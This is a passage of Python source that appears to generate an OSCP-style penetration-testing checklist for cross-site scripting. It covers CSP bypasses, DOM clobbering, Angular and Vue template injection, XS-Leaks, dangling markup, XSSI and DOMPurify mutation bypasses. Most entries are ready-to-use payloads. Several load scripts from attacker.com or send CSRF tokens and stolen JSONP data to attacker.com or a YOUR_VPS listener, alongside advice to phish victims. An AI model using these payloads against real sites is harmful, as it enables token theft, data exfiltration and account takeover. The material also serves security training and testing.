                            'Nonce/hash required',
                            'Inline scripts blocked by CSP'
                        ],
                        'next_steps': [
                            'If no unsafe-*: Look for whitelisted JSONP endpoints',
                            'Check for base-uri missing → <base> tag attack',
                            'Look for CORS misconfiguration + fetch() bypass'
                        ],
                        'notes': 'unsafe-inline = CSP disabled for inline scripts. unsafe-eval = allows eval(), setTimeout(string), Function(). OSCP: Most apps use unsafe-inline (95%+). Strict CSP rare. Check with: curl -I URL | grep -i csp'
                    }
                },
                {
                    'id': f'xss-csp-jsonp-bypass-{port}',
                    'name': 'CSP Bypass via Whitelisted JSONP',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass CSP by abusing whitelisted domains with JSONP endpoints',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'alternatives': [
                            "# Example CSP:\nscript-src 'self' https://api.google.com",
                            '# Google JSONP endpoints:\n<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
                            '# Common JSONP domains:\n- https://www.google.com/complete/search?client=chrome&q=test&callback=alert\n- https://api.vimeo.com/videos?callback=alert\n- https://graph.facebook.com/me?callback=alert',
                            '# Find JSONP:\ncurl "https://whitelisted-domain.com/api?callback=test" | grep "test("',
                            '# Exploit:\n<script src="https://whitelisted-domain.com/api?callback=alert(1)"></script>'
                        ],
                        'success_indicators': [
                            'JSONP endpoint found on whitelisted domain',
                            'Callback parameter controls function name',
                            'Alert fires via JSONP callback'
                        ],
                        'failure_indicators': [
                            'No whitelisted domains with JSONP',
                            'Callback parameter sanitized',
                            'Whitelist is too restrictive'
                        ],
                        'next_steps': [
                            'Test all whitelisted domains for JSONP',
                            "Check for Angular/JSONP bypass: /api?callback=constructor.constructor('alert(1)')",
                            'Try base-uri bypass if JSONP fails'
                        ],
                        'notes': 'JSONP = JSON with Padding. Endpoint: /api?callback=myFunc returns: myFunc({data}). If callback param unsanitized: ?callback=alert(1) → alert(1)({data}). Common vulnerable domains: Google APIs, Facebook Graph, Vimeo, CDNJS. OSCP: Enumerate CSP whitelisted domains, test for JSONP endpoints.'
                    }
                },
                {
                    'id': f'xss-csp-base-uri-{port}',
                    'name': 'CSP Bypass via Missing base-uri',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass CSP by injecting <base> tag when base-uri directive is missing',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'alternatives': [
                            '# Check if base-uri missing in CSP:\ncurl -I URL | grep -i csp | grep -v base-uri',
                            '# Inject base tag:\n<base href="http://attacker.com/">',
                            '# All relative scripts now load from attacker:\n<script src="/static/app.js"></script> → loads http://attacker.com/static/app.js',
                            '# Host malicious app.js on attacker server:\nHTTP server hosting /static/app.js with alert(1)',
                            '# Full exploit:\n1. Inject: <base href="http://attacker.com/">\n2. Wait for page to load relative script\n3. Page loads YOUR script instead of legitimate one'
                        ],
                        'success_indicators': [
                            'base-uri directive missing from CSP',
                            '<base> tag injection possible',
                            'Relative script paths used on page',
                            'Attacker script loaded and executed'
                        ],
                        'failure_indicators': [
                            'base-uri present in CSP',
                            '<base> tag blocked/filtered',
                            'Page uses absolute URLs only',
                            'CSP blocks external scripts'
                        ],
                        'next_steps': [
                            'Setup HTTP server: python3 -m http.server 80',
                            'Create malicious /static/app.js with payload',
                            'Inject: <base href="http://YOUR_IP/">',
                            'Wait for victim to load page'
                        ],
                        'notes': 'base-uri controls <base href> tag. If missing from CSP: <base href="http://attacker.com/"> changes base URL for all relative resources. Condition: Page must use relative script paths (<script src="/js/app.js">). OSCP: Check CSP for base-uri. Rare but high-impact when found.'
                    }
                }
            ]
        })

        # ===================================================================
        # PHASE 5: DOM XSS
        # ===================================================================

        tasks['children'].append({
            'id': f'xss-dom-based-{port}',
            'name': 'DOM-Based XSS Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'xss-dom-sources-{port}',
                    'name': 'Identify DOM Sources',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Find attacker-controllable DOM sources used by JavaScript',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            '# Common DOM sources (attacker-controlled):\nlocation.search (URL params: ?search=XSS)\nlocation.hash (URL fragment: #XSS)\nlocation.href (full URL)\ndocument.URL\ndocument.referrer (HTTP Referer header)\ndocument.cookie\nwindow.name\nlocalStorage.getItem()\nsessionStorage.getItem()\npostMessage() data',
                            '# Test URL parameters:\nhttps://target.com/?search=DOM_XSS_TEST\nhttps://target.com/#DOM_XSS_TEST',
                            '# Check JavaScript console:\ndevTools → Sources → Search for: location.search, location.hash',
                            '# Use DOM Invader (Burp extension):\nAuto-detect sources and sinks'
                        ],
                        'success_indicators': [
                            'JavaScript reads from controllable source',
                            'URL parameter parsed by JS',
                            'Test value visible in DevTools'
                        ],
                        'failure_indicators': [
                            'No client-side JS using URL params',
                            'All input sanitized before use',
                            'Static site with no DOM interaction'
                        ],
                        'next_steps': [
                            'Trace source to sink in DevTools debugger',
                            'Check how source data is used',
                            'Identify dangerous sinks (eval, innerHTML, etc.)'
                        ],
                        'notes': 'DOM XSS = Client-side only (not reflected in HTTP response). View Source shows nothing. Must use DevTools. Common pattern: JS reads location.search and uses it in eval() or innerHTML. OSCP: Open DevTools → Sources → Search for "location.search" in all JS files.'
                    }
                },
                {
                    'id': f'xss-dom-sinks-{port}',
                    'name': 'Identify Dangerous Sinks',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Find dangerous DOM sinks that execute or render attacker data',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            '# JavaScript Execution sinks:\neval(userInput)\nFunction(userInput)\nsetTimeout(userInput)\nsetInterval(userInput)\nexecScript(userInput)',
                            '# HTML Injection sinks:\nelement.innerHTML = userInput\nelement.outerHTML = userInput\ndocument.write(userInput)\njQuery.html(userInput)',
                            '# URL Injection sinks:\nlocation.href = userInput\nlocation.assign(userInput)\nwindow.open(userInput)',
                            "# Attribute Injection sinks:\nelement.setAttribute('src', userInput)\nelement.src = userInput",
                            '# Search in DevTools:\nSources → Search (Ctrl+Shift+F): eval, innerHTML, document.write'
                        ],
                        'success_indicators': [
                            'Dangerous sink found in JavaScript',
                            'User-controlled data flows to sink',
                            'No sanitization between source and sink'
                        ],
                        'failure_indicators': [
                            'All sinks use sanitized data',
                            'Content Security Policy blocks execution',
                            'Framework escapes output automatically'
                        ],
                        'next_steps': [
                            'Trace data flow: Source → Processing → Sink',
                            'Test payload in source: ?search=<img src=x onerror=alert(1)>',
                            'Check if payload reaches sink unsanitized',
                            'Bypass sanitization if present'
                        ],
                        'notes': 'Sink = Dangerous JS function that can execute code. High-impact sinks: eval(), innerHTML, document.write(). OSCP workflow: 1) Find source (location.search) 2) Find sink (eval) 3) Trace data flow 4) Test payload. Use Chrome DevTools debugger to step through JS execution.'
                    }
                },
                {
                    'id': f'xss-dom-clobbering-{port}',
                    'name': 'DOM Clobbering Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject HTML elements to clobber global JavaScript variables',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'alternatives': [
                            '# Basic clobbering (create global var):\n<form id="someObject"></form>\nJS: console.log(typeof someObject) → [object HTMLFormElement]',
                            '# Clobber with controlled value (use <a> tag):\n<a href="controlled_string" id="x"></a>\nJS: console.log(x) → "controlled_string" (toString() returns href)',
                            '# Clobber nested properties:\n<a id="x"><a id="x" name="y" href="controlled"></a></a>\nJS: x.y → "controlled"',
                            '# Clobber 3 levels deep (use form):\n<form id="x" name="y"><input id="z" value="controlled"></form>\nJS: x.y.z.value → "controlled"',
                            '# Exploit pattern:\nif (!window.config) { window.config = {}; }\nscript.src = config.url; // Attacker clobbers config.url',
                            '# Payload:\n<a id="config" href="http://attacker.com/evil.js"></a>'
                        ],
                        'success_indicators': [
                            'HTML id attribute creates global variable',
                            'Clobbered variable used by JavaScript',
                            'Script source or other sink poisoned',
                            'Alert fires via clobbered config'
                        ],
                        'failure_indicators': [
                            'Strict mode prevents clobbering',
                            "Code doesn\'t use window.* pattern",
                            'DOMPurify removes id attributes',
                            'CSP blocks injected script source'
                        ],
                        'next_steps': [
                            'Identify vulnerable pattern: window.obj || {}',
                            'Find how obj is used (script.src, eval, etc.)',
                            'Inject <a id="obj" href="payload">',
                            'Or inject <form id="obj"><input id="attr" value="payload"></form>'
                        ],
                        'notes': 'DOM Clobbering: HTML id/name create global JS variables. Pattern: var x = window.x || {}. If window.x undefined, attacker injects <form id="x"></form> to clobber it. Use <a> tag for string values (href), <form>+<input> for nested properties. OSCP: Search JS for "window." pattern, check if object undefined by default.'
                    }
                }
            ]
        })

        # ===================================================================
        # PHASE 6: CLIENT-SIDE TEMPLATE INJECTION
        # ===================================================================

        tasks['children'].append({
            'id': f'xss-template-injection-{port}',
            'name': 'Client-Side Template Injection (CSTI)',
            'type': 'parent',
            'children': [
                {
                    'id': f'xss-angularjs-csti-{port}',
                    'name': 'AngularJS Template Injection',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/?search=%7B%7B7*7%7D%7D" | grep -E "(49|7\\*7)"',
                        'description': 'Test for AngularJS template injection (CSTI)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'flag_explanations': {
                            '%7B%7B7*7%7D%7D': 'URL-encoded {{7*7}} (AngularJS expression)',
                            'grep -E "(49|7\\\\*7)"': 'Check if expression evaluated (49) or raw (7*7)'
                        },
                        'success_indicators': [
                            'Output shows 49 (expression evaluated)',
                            'AngularJS ng-app attribute found',
                            'Template syntax {{ }} executed'
                        ],
                        'failure_indicators': [
                            'Output shows {{7*7}} (not evaluated)',
                            'No AngularJS detected',
                            'Template syntax escaped'
                        ],
                        'next_steps': [
                            "If 49: Test RCE: {{constructor.constructor('alert(1)')()}}",
                            'Check Angular version: View Source for angular.js version',
                            'Angular 1.6+: Sandbox removed, easier exploitation',
                            'Angular <1.6: Use sandbox escape payloads'
                        ],
                        'alternatives': [
                            '# Detect: {{7*7}} → If output is 49: Angular detected',
                            "# Angular 1.6+ (no sandbox):\n{{constructor.constructor('alert(1)')()}}\n{{$on.constructor(\"alert(1)\")()}}",
                            "# Angular <1.6 (sandbox bypass):\n{{x=constructor.constructor;x('alert(1)')()}}",
                            "# Event-based:\n<input ng-focus=$event.view.alert('XSS')>",
                            "# Google Research:\n<div ng-app ng-csp><textarea autofocus ng-focus=\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//attacker.com/'\"></textarea></div>"
                        ],
                        'notes': "AngularJS CSTI: Inject {{expression}} in ng-app scope. Angular 1.6 removed sandbox → {{constructor.constructor('alert(1)')()}} works. Older versions: sandbox escape needed. Detect with {{7*7}}. OSCP: Check <html ng-app> or <div ng-app> in source."
                    }
                },
                {
                    'id': f'xss-vuejs-csti-{port}',
                    'name': 'Vue.js Template Injection',
                    'type': 'command',
                    'metadata': {
                        'command': f"curl \"{base_url}/?name=" + "%7B%7Bthis.constructor.constructor('alert(1)')()" + "%7D%7D\"",
                        'description': 'Test for Vue.js client-side template injection',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'flag_explanations': {
                            '%7B%7Bthis.constructor.constructor': 'Access Function constructor via this',
                            'alert(1)': 'Code to execute',
                            '%7D%7D': 'Close Vue template expression {{}}'
                        },
                        'success_indicators': [
                            'Alert fires (Vue template executed)',
                            'Vue.js detected in page source',
                            'Expression evaluated by Vue'
                        ],
                        'failure_indicators': [
                            'No alert (template not evaluated)',
                            'Vue.js not present',
                            'Template syntax escaped by backend'
                        ],
                        'next_steps': [
                            'Check Vue version in source',
                            "Test Vue 3 syntax: {{_openBlock.constructor('alert(1)')()}}",
                            'Try v-html directive injection if {{}} fails',
                            'Check for CSP bypass opportunities'
                        ],
                        'alternatives': [
                            "# Vue 2:\n{{this.constructor.constructor('alert(1)')()}}",
                            "# Vue 3:\n{{_openBlock.constructor('alert(1)')()}}",
                            '# Detect: {{7*7}} → Output 49 if Vue present',
                            "# v-html injection:\n<div v-html=\"'\\\".constructor.constructor(\\\"alert(1)'()\\\")></div>",
                            "# Google Research:\n\"><div v-html=\"'\\\".constructor.constructor(\\\"d=document;d.location.hash.match('x1') ? `` : d.location=`//attacker.com`')\\\")()> aaa</div>\"",
                        ],
                        'notes': "Vue.js CSTI similar to Angular. Detect: {{7*7}} → 49. Exploit: {{this.constructor.constructor('alert(1)')()}}. Vue 3 changed internals: use {{_openBlock.constructor}}. OSCP: Check for Vue.js in page source or HTTP headers (X-Powered-By)."
                    }
                },
                {
                    'id': f'xss-react-csti-{port}',
                    'name': 'React dangerouslySetInnerHTML',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for XSS via React dangerouslySetInnerHTML or eval()',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            '# React escapes by default (safe):\n<div>{userInput}</div> → Escaped, no XSS',
                            '# dangerouslySetInnerHTML (unsafe):\n<div dangerouslySetInnerHTML={{__html: userInput}}></div> → XSS possible',
                            '# Find in source:\nView Source → Search for "dangerouslySetInnerHTML"',
                            '# Test payload:\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>',
                            '# eval() in React (rare but dangerous):\neval(userInput) → alert(1) works directly',
                            '# Client-side routing XSS:\nReact Router: /profile/{username} → XSS if username rendered unsafely'
                        ],
                        'success_indicators': [
                            'dangerouslySetInnerHTML found in source',
                            'HTML payload rendered and executed',
                            'eval() or new Function() with user input'
                        ],
                        'failure_indicators': [
                            'React escapes all output (default behavior)',
                            'No dangerouslySetInnerHTML usage',
                            'CSP blocks inline scripts'
                        ],
                        'next_steps': [
                            'Search JS bundles for dangerouslySetInnerHTML',
                            'Test all user input fields for HTML rendering',
                            'Check URL parameters in React Router',
                            'Look for Markdown rendering (often uses dangerouslySetInnerHTML)'
                        ],
                        'notes': 'React SAFE by default: <div>{user}</div> → Escaped. UNSAFE: dangerouslySetInnerHTML={{__html: user}} → XSS. Also check: eval(userInput), new Function(userInput). OSCP: Search JS files for "dangerouslySetInnerHTML" and "eval". Test Markdown fields (often use dangerouslySetInnerHTML).'
                    }
                }
            ]
        })

        # ===================================================================
        # PHASE 7: XS-SEARCH / XS-LEAKS
        # ===================================================================

        tasks['children'].append({
            'id': f'xs-search-attacks-{port}',
            'name': 'XS-Search / XS-Leaks Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'xs-search-basics-{port}',
                    'name': 'XS-Search Fundamentals',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Understand XS-Search attack methodology (cross-origin information leakage)',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'ADVANCED'],
                        'alternatives': [
                            '# XS-Search Components:\n1. Vulnerable Web: Target site with searchable information\n2. Attacker Web: Malicious site victim visits\n3. Inclusion Method: iframe, window.open, fetch, <img>\n4. Leak Technique: Timing, onload/onerror, frame counting\n5. States: Two conditions to distinguish (e.g., logged in vs logged out)',
                            '# Use Case: Extract search results across origin\nExample: Check if victim has "secret-project" in their Gmail',
                            '# High-Level Flow:\n1. Attacker page includes target in iframe\n2. Measures difference (timing, onload, errors)\n3. Infers information based on difference',
                            '# Common detectable differences:\n- Status Code (200 vs 404)\n- Page Content (results vs no results)\n- Timing (fast vs slow response)\n- Redirects (redirect vs no redirect)\n- Frame count (multiple iframes vs single)'
                        ],
                        'success_indicators': [
                            'Detectable difference found between states',
                            'Timing difference measurable',
                            'Onload/onerror events distinguishable',
                            'Information leakage confirmed'
                        ],
                        'failure_indicators': [
                            'Same-origin policy blocks access',
                            'No detectable differences',
                            'X-Frame-Options prevents iframe inclusion',
                            'SameSite cookies prevent authenticated requests'
                        ],
                        'next_steps': [
                            'Check for X-Frame-Options header',
                            'Test SameSite cookie attributes',
                            'Identify measurable differences',
                            'Use XSinator tool for browser testing: https://xsinator.com/'
                        ],
                        'notes': "XS-Search = Side-channel attack to leak cross-origin info. Example: Attacker iframe loads victim\'s search page, measures timing → If slow: results found, If fast: no results. OSCP RELEVANCE: LOW (advanced browser exploitation). More bug bounty than OSCP. XSinator tool: https://xsinator.com/"
                    }
                },
                {
                    'id': f'xs-leak-onload-timing-{port}',
                    'name': 'Timing-Based XS-Leak (onload)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Measure page load time to infer information cross-origin',
                        'tags': ['OSCP:LOW', 'ADVANCED'],
                        'alternatives': [
                            "# JavaScript timing attack:\nconst start = performance.now();\nconst img = new Image();\nimg.src = 'https://target.com/search?q=secret';\nimg.onload = () => {\n  const duration = performance.now() - start;\n  if (duration > 500) alert(\"Results found!\");\n};",
                            "# Iframe timing:\nconst iframe = document.createElement('iframe');\niframe.sandbox = \"allow-scripts\"; // Block JS to measure only network time\nconst start = performance.now();\niframe.src = \"https://target.com/search?q=secret\";\niframe.onload = () => {\n  const duration = performance.now() - start;\n  console.log('Load time:', duration);\n};",
                            '# Advanced: Force heavy task after load\niframe.onload = () => {\n  // Measure time for postMessage response\n  // Slow = large search results (heavy DOM)\n  // Fast = no results (light DOM)\n};'
                        ],
                        'success_indicators': [
                            'Timing difference detected (>100ms)',
                            'Results page loads slower than no-results',
                            'Consistent timing across multiple tests'
                        ],
                        'failure_indicators': [
                            'Timing too noisy (inconsistent)',
                            'SameSite cookies prevent authenticated timing',
                            'X-Frame-Options blocks iframe',
                            'Network jitter too high'
                        ],
                        'next_steps': [
                            'Test multiple queries to establish baseline',
                            'Use binary search to extract data',
                            'Combine with other XS-Leak techniques',
                            'Check for CORB/CORP headers'
                        ],
                        'notes': 'Timing XS-Leak: Measure performance.now() before/after resource load. Application: Search results (slow) vs no results (fast). Limitations: Noisy, requires many samples. OSCP: LOW relevance (academic attack, hard to exploit). Bug bounty: Medium severity if user PII leakable.'
                    }
                },
                {
                    'id': f'xs-leak-frame-counting-{port}',
                    'name': 'Frame Counting XS-Leak',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Count iframes cross-origin to infer page content',
                        'tags': ['OSCP:LOW', 'ADVANCED'],
                        'alternatives': [
                            "# Frame counting attack:\nconst iframe = document.createElement('iframe');\niframe.src = \"https://target.com/results?search=secret\";\ndocument.body.appendChild(iframe);\niframe.onload = () => {\n  const frameCount = iframe.contentWindow.length;\n  // If results: frameCount > 0 (pagination iframes)\n  // If no results: frameCount == 0\n  console.log('Frame count:', frameCount);\n};",
                            '# Readable cross-origin:\nwindow.frames.length → Accessible cross-origin\nwindow.frame[0] → Blocked by SOP, but .length works',
                            '# Use case:\nSearch results page with pagination iframes:\n- Results found: Multiple iframes (page 1, 2, 3...)\n- No results: Zero iframes',
                            '# Binary search extraction:\nfor (let i=0; i<256; i++) {\n  testChar(String.fromCharCode(i));\n}'
                        ],
                        'success_indicators': [
                            'Frame count accessible cross-origin',
                            'Different counts for different states',
                            'Information extracted via binary search'
                        ],
                        'failure_indicators': [
                            'X-Frame-Options blocks iframe',
                            "Page structure doesn\'t use iframes",
                            'Frame count always same',
                            'SameSite=Strict cookies'
                        ],
                        'next_steps': [
                            'Identify pages with conditional iframes',
                            'Map frame count to information states',
                            'Automate binary search extraction',
                            'Chain with other XS-Leaks'
                        ],
                        'notes': 'window.frames.length readable cross-origin. Use case: Pagination iframes differ between results/no-results. Example: Gmail search with results → 3 iframes (pagination), No results → 0 iframes. OSCP: Not relevant for exam. Bug bounty: Low-Medium severity.'
                    }
                }
            ]
        })

        # ===================================================================
        # PHASE 8: DANGLING MARKUP INJECTION
        # ===================================================================

        tasks['children'].append({
            'id': f'xss-dangling-markup-{port}',
            'name': 'Dangling Markup Injection',
            'type': 'parent',
            'children': [
                {
                    'id': f'dangling-markup-basics-{port}',
                    'name': 'Dangling Markup Fundamentals',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit HTML scriptless injection when XSS is impossible',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'alternatives': [
                            "# Scenario: < allowed but <script> blocked\nImpossible: <script>alert(1)</script>\nPossible: <img src='http://attacker.com?data=",
                            "# Dangling markup attack:\n<img src='http://attacker.com?leak=\n<!-- Rest of HTML becomes part of src attribute -->\n<input name=\"csrf\" value=\"SECRET_TOKEN\">",
                            '# Attacker receives:\nGET /?leak=<input name="csrf" value="SECRET_TOKEN"> HTTP/1.1',
                            '# Key concept: Unclosed attribute captures subsequent HTML',
                            '# Requirements:\n1. Inject < allowed\n2. Single quote allowed\n3. Target data appears after injection\n4. No > before target data'
                        ],
                        'success_indicators': [
                            'Subsequent HTML captured in attribute',
                            'Attacker server receives leaked data',
                            'CSRF token or sensitive data exfiltrated'
                        ],
                        'failure_indicators': [
                            'Single quotes blocked',
                            'Angle brackets encoded',
                            'CSP blocks external images',
                            'No sensitive data after injection point'
                        ],
                        'next_steps': [
                            'Identify injection point before sensitive data',
                            'Setup HTTP server to capture requests',
                            "Test payload: <img src=\'http://YOUR_IP?data=",
                            'Check attacker logs for captured HTML'
                        ],
                        'notes': "Dangling Markup = HTML injection when JS execution blocked. Exploit: Unclosed attribute captures subsequent HTML. Example: <img src=\'http://attacker.com?steal= → Browser sends everything until next quote to attacker. Use case: Steal CSRF tokens, session IDs in HTML. OSCP: Medium relevance (bypass WAF without <script>)."
                    }
                },
                {
                    'id': f'dangling-markup-csrf-theft-{port}',
                    'name': 'CSRF Token Theft via Dangling Markup',
                    'type': 'command',
                    'metadata': {
                        'command': f"curl \"{base_url}/?comment=<img src='http://YOUR_VPS:8000?leak=\" | grep -A 5 csrf",
                        'description': 'Steal CSRF token using dangling markup when XSS blocked',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'flag_explanations': {
                            '?comment=': 'Injection parameter',
                            "<img src=\'http://YOUR_VPS:8000?leak=": 'Start dangling attribute',
                            'grep -A 5 csrf': 'Show CSRF token area (verify it comes after injection)'
                        },
                        'success_indicators': [
                            'CSRF token visible after injection point',
                            'VPS logs show GET request with token',
                            'Token successfully exfiltrated'
                        ],
                        'failure_indicators': [
                            'CSP blocks external images',
                            'CSRF token appears before injection',
                            'Quotes are encoded/escaped',
                            'Image tag stripped by sanitizer'
                        ],
                        'next_steps': [
                            'Setup listener: nc -lvnp 8000',
                            'Or: python3 -m http.server 8000',
                            'Send payload to victim (phishing)',
                            'Capture token from VPS logs',
                            'Use stolen token for CSRF attack'
                        ],
                        'alternatives': [
                            "# Various payloads:\n<img src='http://attacker.com?leak=\n<style>@import\"http://attacker.com?leak=\n<link rel=stylesheet href=\"http://attacker.com?leak=\n<base href='http://attacker.com/\n<meta http-equiv=refresh content=\"0;url=http://attacker.com?leak=",
                            '# Setup listener:\npython3 -m http.server 8000\nnc -lvnp 8000',
                            "# Full exploit:\n1. Find injection before CSRF token\n2. Inject: <img src='http://YOUR_IP?leak=\n3. Victim loads page → Browser fetches image\n4. Image URL contains CSRF token\n5. Attacker logs capture token"
                        ],
                        'notes': "Attack chain: 1) Inject <img src='http://attacker?data= 2) Browser sends GET with all HTML until next \" 3) CSRF token captured in URL 4) Use token for CSRF. OSCP: Setup Python HTTP server to capture. Dangling markup bypasses XSS filters but still leaks data."
                    }
                }
            ]
        })

        # ===================================================================
        # PHASE 9: XSSI (Cross-Site Script Inclusion)
        # ===================================================================

        tasks['children'].append({
            'id': f'xssi-attacks-{port}',
            'name': 'XSSI (Cross-Site Script Inclusion)',
            'type': 'parent',
            'children': [
                {
                    'id': f'xssi-basics-{port}',
                    'name': 'XSSI Fundamentals',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit scripts loaded cross-origin to steal sensitive data',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'ADVANCED'],
                        'alternatives': [
                            '# XSSI Concept:\n<script> tags exempt from Same-Origin Policy\n<script src="https://victim.com/api/user.js"></script> → Loads cross-origin',
                            '# Vulnerable patterns:\n1. Sensitive data in global JS variables\n2. JSONP callbacks with sensitive data\n3. Dynamic JavaScript with authentication',
                            '# Example vulnerable endpoint:\nhttps://api.example.com/userdata.js:\n  var userData = {"email":"victim@example.com", "ssn":"123-45-6789"};',
                            '# Exploit:\n<script src="https://api.example.com/userdata.js"></script>\n<script>alert(userData.ssn);</script>',
                            '# JSONP vulnerable pattern:\nhttps://api.example.com/data?callback=processData:\n  processData({"secret":"data"});',
                            "# Exploit JSONP:\n<script>\n  function processData(data) {\n    fetch('http://attacker.com?stolen=' + JSON.stringify(data));\n  }\n</script>\n<script src=\"https://api.example.com/data?callback=processData\"></script>",
                        ],
                        'success_indicators': [
                            'Sensitive data in JavaScript file',
                            'JSONP callback parameter controllable',
                            'Cross-origin script inclusion works',
                            'Data exfiltrated to attacker server'
                        ],
                        'failure_indicators': [
                            'API returns JSON (not JavaScript)',
                            'CORS blocks cross-origin requests',
                            'No sensitive data in JS files',
                            'JSONP callback sanitized'
                        ],
                        'next_steps': [
                            'Identify JS endpoints with sensitive data',
                            'Test JSONP endpoints: /api?callback=test',
                            'Check if authentication cookies sent with <script> requests',
                            'Build exploit page to exfiltrate data'
                        ],
                        'notes': "XSSI = Include victim's authenticated JS file cross-origin. Key: <script src=> ignores CORS. If endpoint returns: var secret=\"data\"; → Attacker can read via <script> inclusion. JSONP worse: Attacker controls callback function. OSCP: LOW relevance. Modern APIs use JSON (not JavaScript) + CORS."
                    }
                },
                {
                    'id': f'xssi-jsonp-exploitation-{port}',
                    'name': 'JSONP XSSI Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit JSONP endpoints to steal authenticated data cross-origin',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'alternatives': [
                            '# Identify JSONP:\ncurl "https://api.example.com/user?callback=test"\n→ Output: test({"email":"victim@example.com"})',
                            "# Build exploit page:\n<script>\nfunction stealData(data) {\n  fetch('http://attacker.com/collect', {\n    method: \"POST\",\n    body: JSON.stringify(data)\n  });\n}\n</script>\n<script src=\"https://api.example.com/user?callback=stealData\"></script>",
                            '# Advanced: Hijack existing callback\nIf page uses: angular.callbacks._7\nInject before script loads:\n<script>\nvar angular = {callbacks: {}};\nangular.callbacks._7 = function(data) {\n  alert(JSON.stringify(data));\n};\n</script>\n<script src="https://vulnerable-api.com/data?callback=angular.callbacks._7"></script>',
                            '# Send to victim (phishing)\nVictim visits attacker page → Authenticated JSONP request → Data stolen'
                        ],
                        'success_indicators': [
                            'JSONP callback controllable',
                            'Authenticated data returned',
                            'Data exfiltrated to attacker',
                            'Victim cookies sent with request'
                        ],
                        'failure_indicators': [
                            'Callback parameter sanitized (whitelist)',
                            'SameSite=Strict cookies',
                            'JSONP not authenticated',
                            'No sensitive data in response'
                        ],
                        'next_steps': [
                            'Enumerate all API endpoints',
                            'Test callback parameter: ?callback=alert(1)',
                            'Check if authenticated: compare with/without cookies',
                            'Setup data collection server',
                            'Craft phishing page'
                        ],
                        'notes': "JSONP = JSON with Padding. Endpoint: /api?callback=myFunc returns: myFunc({data}). Attacker controls callback function → Steals data. Check: curl 'URL?callback=test' → If returns test({...}): Vulnerable. OSCP: Check APIs for ?callback= param. Modern apps avoid JSONP (use CORS instead)."
                    }
                }
            ]
        })

        # ===================================================================
        # PHASE 10: MUTATION XSS (mXSS)
        # ===================================================================

        tasks['children'].append({
            'id': f'mxss-attacks-{port}',
            'name': 'Mutation XSS (mXSS)',
            'type': 'parent',
            'children': [
                {
                    'id': f'mxss-basics-{port}',
                    'name': 'mXSS Fundamentals',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit browser DOM parsing mutations to bypass sanitizers',
                        'tags': ['OSCP:LOW', 'ADVANCED', 'RESEARCH'],
                        'alternatives': [
                            '# mXSS Concept:\n1. Input sanitized by server/library (safe HTML)\n2. Browser mutates DOM during parsing\n3. Mutation creates executable XSS',
                            '# Example: Backtick mutation\nInput: <noscript><p title="</noscript><img src=x onerror=alert(1)>">',
                            'Sanitizer sees: <noscript> (safe, script disabled)\nBrowser parses: </noscript> closes tag → <img> executes',
                            '# Example: Namespace confusion\nInput: <svg><style><img src=x onerror=alert(1)></style></svg>\nSanitizer: Safe (CSS context)\nBrowser: SVG namespace allows <img> execution',
                            '# Example: Form mutation\nInput: <form><math><mtext></form><img src=x onerror=alert(1)>',
                            '# mXSS via DOMPurify bypass:\nInput: <svg><p><style><a id="</style><img src=x onerror=alert(1)>">'
                        ],
                        'success_indicators': [
                            'Sanitizer allows payload',
                            'Browser mutates DOM after sanitization',
                            'Alert fires post-mutation',
                            'Sanitizer bypass confirmed'
                        ],
                        'failure_indicators': [
                            'Sanitizer blocks all tags',
                            'No DOM mutation occurs',
                            "Browser doesn\'t support mutation",
                            'CSP blocks inline scripts'
                        ],
                        'next_steps': [
                            'Identify sanitizer: DOMPurify, js-xss, bleach',
                            'Test known mXSS vectors for that sanitizer',
                            'Use browser DevTools to observe DOM mutations',
                            'Check CVE database for sanitizer bypasses'
                        ],
                        'notes': 'mXSS = Mutation XSS. Sanitizer safe → Browser mutates → XSS. Causes: 1) namespace confusion (SVG, MathML) 2) parser ambiguity (<noscript>) 3) form element mutation. OSCP: LOW relevance (rare, advanced). Bug bounty: HIGH severity if found. Tools: DOMPurify has mXSS history. Check: https://github.com/cure53/DOMPurify/releases'
                    }
                },
                {
                    'id': f'mxss-dompurify-bypass-{port}',
                    'name': 'DOMPurify mXSS Bypass Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for known DOMPurify mutation XSS bypasses',
                        'tags': ['OSCP:LOW', 'ADVANCED'],
                        'alternatives': [
                            '# Check DOMPurify version:\nView Source → Search for "DOMPurify"\nOr: Browser console: DOMPurify.version',
                            '# Historical bypasses:\n# CVE-2019-20374:\n<svg><p><style><a id="</style><img src=x onerror=alert(1)>">\n\n# CVE-2020-26870:\n<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)></style></mglyph></form>\n\n# Namespace confusion:\n<svg><style><title><![CDATA[</title><img src=x onerror=alert(1)>]]></style></svg>',
